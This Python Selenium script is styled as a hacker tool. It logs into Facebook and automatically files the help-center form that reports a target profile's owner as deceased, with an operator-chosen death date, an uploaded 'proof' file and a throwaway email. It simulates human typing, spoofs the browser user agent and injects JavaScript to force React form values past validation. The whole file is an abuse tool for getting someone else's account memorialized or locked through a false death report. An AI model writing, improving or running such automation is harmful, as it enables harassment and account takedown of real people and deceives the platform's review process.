#!/usr/bin/env python3
import os
import sys
import time
import random
import string
from datetime import datetime

# Importations Selenium
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ==========================================
# 1. STYLE CONFIG
# ==========================================
R = "\033[91m" ; G = "\033[92m" ; Y = "\033[93m"
C = "\033[96m" ; W = "\033[97m" ; X = "\033[0m"

def clear(): os.system('clear')

def banner():
    clear()
    print(f"""{G}
      TERMUX EDITION • REACT BYPASS
      {R}╔═══════════════════════════════════════════╗
      ║    FACEBOOK REACT DOM INJECTION TOOL      ║
      ║         DEV BY: {Y}OTF x DJAMAL19{R}            ║
      ╚═══════════════════════════════════════════╝{X}
""")

def loading(percent, status=""):
    bar_len = 20
    filled_len = int(round(bar_len * percent / 100))
    bar = f"{G}█{X}" * filled_len + f"{C}░{X}" * (bar_len - filled_len)
    sys.stdout.write(f'\r  {C}[{bar}{C}] {G}{percent}%{X} :: {status}\033[K')
    sys.stdout.flush()

def type_human(element, text):
    time.sleep(random.uniform(0.5, 1.0))
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

# ==========================================
# 2. CONFIGURATION
# ==========================================
banner()
if not os.path.exists("/sdcard"):
    print(f"  {R}[ERROR] STORAGE DENIED.{X}"); exit()

while True:
    sys.stdout.write(f"  {C}root@termux:~# {X}SET LHOST_USER : {G}")
    sys.stdout.flush()
    EMAIL = input().strip()
    print(f"{X}", end="") 
    if EMAIL: break

while True:
    sys.stdout.write(f"  {C}root@termux:~# {X}SET LHOST_PASS : {G}")
    sys.stdout.flush()
    PASSWORD = input().strip() # Visible pour éviter les erreurs
    print(f"{X}", end="") 
    if PASSWORD: break

print(f"\n  {R}[SYSTEM] TARGET CONFIGURATION{X}")

sys.stdout.write(f"  {C}root@termux:~# {X}SET RHOST_URL  : {G}")
sys.stdout.flush()
url_profil = input().strip()

sys.stdout.write(f"  {C}root@termux:~# {X}SET DATE (11/12/2025) : {G}")
sys.stdout.flush()
date_input = input().strip()
# On s'assure que le format est bien JJ/MM/AAAA
if "-" in date_input:
    y, m, d = date_input.split("-")
    date_deces = f"{d}/{m}/{y}"
else:
    date_deces = date_input if date_input else datetime.now().strftime("%d/%m/%Y")

sys.stdout.write(f"  {C}root@termux:~# {X}SET BINARY_SRC : {G}")
sys.stdout.flush()
preuve_path = input().strip().strip('"\'')

sys.stdout.write(f"  {C}root@termux:~# {X}SET PROXY_MAIL : {G}")
sys.stdout.flush()
email_temp = input().strip()

if not os.path.isfile(preuve_path):
    print(f"\n  {R}[ERROR 404] FILE NOT FOUND.{X}"); exit(1)

banner()
print(f"\n  {Y}[*] STARTING FIREFOX ENGINE...{X}\n")

# ==========================================
# 3. EXÉCUTION
# ==========================================
driver = None
try:
    loading(5, "LOCATING DRIVER...")
    gecko_path = "/data/data/com.termux/files/usr/bin/geckodriver"
    if not os.path.exists(gecko_path): gecko_path = "/usr/bin/geckodriver"
    
    service = Service(executable_path=gecko_path)
    options = FirefoxOptions()
    options.add_argument("--headless") 
    options.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0")
    
    driver = webdriver.Firefox(service=service, options=options)
    driver.set_window_size(1080, 2400)
    wait = WebDriverWait(driver, 30)

    # LOGIN LOOP
    while True:
        sys.stdout.write("\r" + " " * 80 + "\r")
        print(f"\n  {Y}[AUTH] CONNEXION...{X}")
        
        loading(10, "CONNECTING...")
        driver.get("https://www.facebook.com/")
        try:
            time.sleep(2)
            btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Autoriser') or contains(text(), 'Accept')]")
            if btns: btns[0].click()
        except: pass

        loading(20, "INJECTING CREDENTIALS...")
        try:
            email_field = wait.until(EC.presence_of_element_located((By.NAME, "email")))
            email_field.clear()
            type_human(email_field, EMAIL)
            
            pass_field = driver.find_element(By.NAME, "pass")
            pass_field.clear()
            type_human(pass_field, PASSWORD)
            
            try: driver.find_element(By.NAME, "login").click()
            except: pass_field.send_keys(Keys.ENTER)
        except: pass

        loading(40, "VERIFYING STATUS...")
        time.sleep(8)

        if "login_attempt" in driver.current_url or "incorrect" in driver.page_source.lower():
            print(f"\n\n  {R}[ERROR] IDENTIFIANTS INCORRECTS ! REESSAYEZ.{X}")
            EMAIL = input(f"  {C}Email : {G}").strip()
            PASSWORD = input(f"  {C}Pass  : {G}").strip()
            continue
        elif "checkpoint" in driver.current_url or "two_step" in driver.current_url:
            print(f"\n  {R}[!] 2FA DÉTECTÉ.{X} {W}Validez sur le tel puis faites Entrée.{X}")
            input()
            break
        else:
            print(f"\n  {G}[SUCCESS] CONNECTÉ.{X}"); break

    # FORMULAIRE
    loading(50, "ACCESSING FORM...")
    driver.get("https://www.facebook.com/help/contact/234739086860192")
    
    # URL
    loading(60, "INJECTING URL...")
    try:
        url_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
        url_field.send_keys(url_profil)
    except: pass

    # ====================================================
    # 🔥 DATE FIX : REACT SETTER HACK 🔥
    # ====================================================
    loading(70, f"FORCING DATE ({date_deces})...")
    try:
        # Script JS Spécial pour forcer React à voir la valeur
        react_hack = """
        let input = arguments[0];
        let value = arguments[1];
        let lastValue = input.value;
        input.value = value;
        let event = new Event('input', { bubbles: true });
        // Hack pour React 15/16
        let tracker = input._valueTracker;
        if (tracker) { tracker.setValue(lastValue); }
        input.dispatchEvent(event);
        """
        
        # On trouve le champ date
        date_field = None
        inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
        
        # Le champ date est souvent le 2ème input texte
        if len(inputs) >= 2:
            date_field = inputs[1]
        else:
            # Fallback sur la classe
            try: date_field = driver.find_element(By.CSS_SELECTOR, "input._3smp")
            except: pass

        if date_field:
            date_field.click()
            time.sleep(0.5)
            # Injection Brutale
            driver.execute_script(react_hack, date_field, date_deces)
            time.sleep(0.5)
            # On simule aussi la touche TAB pour la validation UI
            date_field.send_keys(Keys.TAB)
            
    except Exception as e: print(f"\n[DEBUG] {e}")

    # Upload
    loading(80, "UPLOADING...")
    try:
        file_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
        file_input.send_keys(os.path.abspath(preuve_path))
    except: pass

    # Email
    loading(85, "EMAIL...")
    try:
        email_field = driver.find_element(By.NAME, "email")
    except:
        inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
        email_field = inputs[-1]
    email_field.send_keys(email_temp)

    # Envoi
    loading(90, "SENDING...")
    time.sleep(3)
    try:
        # Clic JS forcé
        btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        driver.execute_script("arguments[0].click();", btn)
    except:
        try:
            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Envoyer')]")
            submit_btn.click()
        except: pass

    # Fin
    loading(95, "CONFIRMING...")
    time.sleep(8)
    save_path = "/sdcard/TERMUX_PROOF.png"
    driver.save_screenshot(save_path)
    
    if "merci" in driver.page_source.lower() or "thank" in driver.page_source.lower():
        loading(100, "DONE.")
        print(f"\n\n  {G}✔ SUCCÈS - PREUVE : {save_path}{X}")
    else:
        loading(99, "SENT.")
        print(f"\n\n  {Y}[!] ENVOYÉ. VÉRIFIEZ : {save_path}{X}")

    input(f"\n  {W}Entrée pour quitter...{X}")

except Exception as e:
    sys.stdout.write("\r" + " " * 80 + "\r")
    print(f"\n  {R}[ERROR] {e}{X}")
    if driver: driver.save_screenshot("/sdcard/termux_crash.png")
    input()
finally:
    if driver: driver.quit()
